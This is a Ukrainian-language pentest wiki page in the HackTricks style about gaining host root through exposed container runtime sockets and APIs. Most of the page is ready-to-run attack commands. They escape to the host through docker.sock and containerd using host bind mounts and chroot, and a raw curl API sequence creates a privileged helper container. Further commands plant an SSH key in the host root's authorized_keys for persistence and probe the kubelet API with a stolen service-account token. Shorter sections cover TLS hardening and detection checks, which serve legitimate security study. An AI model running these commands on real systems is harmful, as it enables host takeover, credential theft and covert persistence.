# Відкритий доступ до Runtime API та daemon

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Багато реальних компрометацій контейнерів починаються не з виходу з namespace. Вони починаються з доступу до control plane runtime. Якщо workload може взаємодіяти з `dockerd`, `containerd`, CRI-O, Podman або kubelet через змонтований Unix-сокет чи відкритий TCP-listener, зловмисник може запросити створення нового контейнера з ширшими привілеями, змонтувати файлову систему хоста, приєднатися до namespace хоста або отримати конфіденційну інформацію про вузол. У таких випадках справжньою межею безпеки є Runtime API, і його компрометація фактично майже рівнозначна компрометації хоста.

Саме тому відкритий доступ до сокета runtime слід документувати окремо від захисту ядра. Контейнер зі звичайними налаштуваннями seccomp, capabilities і MAC confinement усе одно може бути за один виклик API від компрометації хоста, якщо всередині нього змонтовано `/var/run/docker.sock` або `/run/containerd/containerd.sock`. Ізоляція поточного контейнера на рівні ядра може працювати саме так, як задумано, тоді як площина керування runtime залишається повністю відкритою.

## Моделі доступу до daemon

Docker Engine традиційно надає доступ до свого привілейованого API через локальний Unix-сокет `unix:///var/run/docker.sock`. Історично його також відкривали віддалено через TCP-listener, як-от `tcp://0.0.0.0:2375`, або listener із захистом TLS на порту `2376`. Відкритий віддалений доступ до daemon без надійного TLS і автентифікації клієнтів фактично перетворює Docker API на віддалений інтерфейс root-доступу.

`containerd`, CRI-O, Podman і kubelet відкривають подібні поверхні з високим рівнем впливу. Назви та процеси відрізняються, але логіка — ні. Якщо інтерфейс дає змогу викликачеві створювати workload, монтувати шляхи хоста, отримувати облікові дані або змінювати запущені контейнери, це привілейований канал керування, до якого слід відповідно ставитися.

Вебінтерфейс керування контейнерами може відкрити ту саму межу без надання локальному обліковому запису прямого доступу до сокета. Наприклад, у [Portainer issue #493](https://github.com/portainer/portainer/issues/493) задокументовано скидання пароля адміністратора без автентифікації у застарілій збірці 1.11.1. Розглядайте доступний локально UI лише як напрям для перевірки: підтвердьте встановлену збірку та поведінку автентифікації, фактичний контроль адміністратора, а також те, чи може керований ним endpoint створювати контейнери з доступним для запису bind mount хоста. [Документація Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) зазначає, що для керування через сокет потрібен доступ до Docker-сокета; rootless або обмежений endpoint зменшує вплив на хост. Не робіть висновків про вразливість автентифікації чи root-доступ до хоста лише за назвою процесу, портом або рядком версії.

Поширені локальні шляхи, які варто перевірити:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Старіші або більш спеціалізовані стеки також можуть відкривати такі кінцеві точки, як `dockershim.sock`, `frakti.sock` або `rktlet.sock`. У сучасних середовищах вони трапляються рідше, але в разі виявлення до них слід ставитися так само обережно, оскільки це поверхні керування runtime, а не звичайні сокети застосунків.

## Secure Remote Access

Якщо daemon потрібно відкрити за межами локального сокета, з’єднання слід захистити за допомогою TLS і, бажано, взаємної автентифікації, щоб daemon перевіряв клієнта, а клієнт — daemon. Стара звичка відкривати Docker daemon через незахищений HTTP заради зручності — одна з найнебезпечніших помилок в адмініструванні контейнерів, оскільки поверхня API достатньо потужна, щоб безпосередньо створювати привілейовані контейнери.

Історичний шаблон конфігурації Docker виглядав так:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

У системах на базі systemd взаємодія з daemon також може виконуватися через `fd://`: процес успадковує попередньо відкритий socket від systemd, а не прив’язує його безпосередньо. Важливий не точний синтаксис, а наслідки для безпеки. Щойно daemon починає слухати не лише на локальному socket із суворими дозволами, захист транспортного рівня та автентифікація клієнтів стають обов’язковими, а не просто додатковим посиленням безпеки.

## Зловживання

Якщо присутній runtime socket, з’ясуйте, який саме, чи є сумісний клієнт і чи можливий доступ через raw HTTP або gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Ці команди корисні, оскільки дають змогу відрізнити неактивний шлях від змонтованого, але недоступного сокета та активного привілейованого API. Якщо клієнт працює, наступне питання — чи може API запустити новий контейнер із bind mount хоста або спільним використанням простору імен хоста.

### Коли клієнт не встановлено

Відсутність `docker`, `podman` чи іншого зручного CLI не означає, що сокет безпечний. Docker Engine обмінюється даними через HTTP поверх свого Unix-сокета, а Podman надає як сумісний із Docker API, так і нативний API Libpod через `podman system service`. Отже, для керування демоном може вистачити мінімального середовища, у якому є лише `curl`:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Це важливо під час post-exploitation, оскільки захисники іноді видаляють звичні клієнтські бінарні файли, але залишають змонтований сокет керування. На хостах Podman пам’ятайте, що цінний шлях відрізняється для rootful і rootless розгортань: `unix:///run/podman/podman.sock` для rootful екземплярів сервісу та `unix://$XDG_RUNTIME_DIR/podman/podman.sock` для rootless.

### Повний приклад: від Docker Socket до root хоста

Якщо `docker.sock` доступний, класичний спосіб втечі — запустити новий контейнер, змонтувати в ньому кореневу файлову систему хоста, а потім виконати `chroot` у неї:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Це забезпечує безпосереднє виконання команд із правами root на хості через Docker daemon. Наслідки не обмежуються читанням файлів. Опинившись у новому контейнері, зловмисник може змінювати файли хоста, збирати облікові дані, закріпитися в системі або запускати додаткові привілейовані робочі навантаження.

### Повний приклад: від Docker Socket до namespace хоста

Якщо зловмисник віддає перевагу входженню в namespace замість доступу лише до файлової системи:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Цей шлях дістається до host, змушуючи runtime створити новий container із явним доступом до namespace host, а не використовуючи вразливість у поточному container.

### Шаблон persistence через Docker Socket

Керування runtime також можна використовувати для persistence, а не лише для одноразового shell. Загальний шаблон — створити допоміжний container із монтуванням host, записати матеріали для авторизованого доступу або startup hook у змонтовану файлову систему host, а потім перевірити, чи використовує їх host.

Приклад структури:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

Та сама ідея може бути застосована до юнітів systemd, фрагментів cron, файлів запуску застосунків або SSH-ключів — залежно від того, що оператор хоче довести. Важливо те, що постійна зміна вноситься через повноваження runtime daemon щодо файлової системи хоста, а не завдяки додатковим привілеям в оригінальному контейнері.

### Перехід через helper для Raw Docker API

Якщо Docker CLI відсутній, той самий потік роботи з helper і монтуванням хоста можна запустити через HTTP через Unix-сокет. Загальний порядок такий: перевірити API, створити helper-контейнер із bind mount хоста, запустити його, створити екземпляр exec і запустити цей exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

Фінальний запит `/exec/<id>/start` залежить від повернутого exec ID, але суть безпеки не залежить від точних деталей JSON: прямого доступу до API rootful Docker daemon достатньо, щоб запросити потужніше допоміжне навантаження.

### Повний приклад: сокет containerd

Змонтований сокет `containerd` зазвичай не менш небезпечний:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Якщо доступний клієнт, більш схожий на Docker, `nerdctl` може бути зручнішим за `ctr`, оскільки він підтримує звичні прапорці, такі як `--privileged`, `--pid=host` і `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

Вплив знову полягає в компрометації хоста. Навіть якщо інструменти, специфічні для Docker, відсутні, інший runtime API усе ще може надавати ті самі адміністративні можливості. На вузлах Kubernetes `crictl` також може бути достатнім для розвідки та взаємодії з контейнерами, оскільки він напряму звертається до кінцевої точки CRI.

### Сокет BuildKit

`buildkitd` легко не помітити, оскільки його часто вважають «лише backend для збірки», але демон усе одно є привілейованою площиною керування. Доступний `buildkitd.sock` може дозволити зловмиснику виконувати довільні кроки збірки, перевіряти можливості worker, використовувати локальні контексти зі скомпрометованого середовища та запитувати небезпечні entitlements, як-от `network.host` або `security.insecure`, якщо демон налаштовано дозволяти їх.

Спершу корисно виконати такі дії:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Якщо демон приймає запити на збирання, перевірте, чи доступні небезпечні entitlements:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

Точний вплив залежить від конфігурації демона, але rootful-сервіс BuildKit із permissive entitlements — це не нешкідлива зручність для розробників. Розглядайте його як ще одну важливу адміністративну поверхню, особливо на CI runners і спільних вузлах збірки.

### API Kubelet через TCP

kubelet — це не container runtime, але він усе одно є частиною площини керування вузлом і часто фігурує в обговореннях тієї самої межі довіри. Якщо захищений порт kubelet `10250` доступний із workload або розкрито облікові дані вузла, kubeconfig-файли чи права на проксі, зловмисник може отримати список Pods, переглянути журнали або виконувати команди в контейнерах на вузлі, так і не взаємодіючи зі шляхом admission API-сервера Kubernetes.

Почніть із простого виявлення:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Якщо шлях через kubelet або проксі API-сервера дозволяє `exec`, клієнт із підтримкою WebSocket може перетворити це на виконання коду в інших контейнерах на вузлі. Саме тому `nodes/proxy` лише з дозволом `get` небезпечніший, ніж здається: запит усе одно може дістатися кінцевих точок kubelet, які виконують команди, а такі прямі взаємодії з kubelet не відображаються у звичайних журналах аудиту Kubernetes.<sup>[[2]](#references)</sup>

## Перевірки

Мета цих перевірок — з’ясувати, чи може контейнер дістатися будь-якої площини керування, яка мала залишатися за межами межі довіри.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Що тут цікаво:

- Змонтований сокет runtime зазвичай є прямим адміністративним примітивом, а не просто способом розкрити інформацію.
- TCP-слухач на `2375` без TLS слід вважати умовою для віддаленої компрометації.
- Змінні середовища на кшталт `DOCKER_HOST` часто свідчать, що workload навмисно налаштовано для взаємодії з runtime хоста.

## Типові налаштування runtime

| Runtime / платформа | Типовий стан | Типова поведінка | Поширене ручне послаблення захисту |
| --- | --- | --- | --- |
| Docker Engine | Локальний Unix-сокет за замовчуванням | `dockerd` слухає локальний сокет, а daemon зазвичай працює з root-привілеями | монтування `/var/run/docker.sock`, відкриття `tcp://...:2375`, слабкий або відсутній TLS на `2376` |
| Podman | CLI без daemon за замовчуванням | Для звичайного локального використання не потрібен постійно запущений привілейований daemon; API-сокети все одно можуть бути відкриті, якщо ввімкнено `podman system service` | відкриття `podman.sock`, широке надання доступу до service, використання API з root-привілеями |
| containerd | Локальний привілейований сокет | Адміністративний API доступний через локальний сокет і зазвичай використовується інструментами вищого рівня | монтування `containerd.sock`, широкий доступ до `ctr` або `nerdctl`, відкриття привілейованих namespace |
| CRI-O | Локальний привілейований сокет | Кінцева точка CRI призначена для довірених компонентів, локальних для вузла | монтування `crio.sock`, відкриття кінцевої точки CRI для недовірених workload |
| Kubernetes kubelet | API керування, локальний для вузла | Kubelet не повинен бути широко доступним із Pod; залежно від authn/authz доступ може розкривати стан Pod, облікові дані та можливості виконання команд | монтування сокетів або сертифікатів kubelet, слабка автентифікація kubelet, host networking разом із доступною кінцевою точкою kubelet |

## References

- [1] [Експлуатація сокета containerd, частина 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Ризики обходу Kubernetes API Server](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
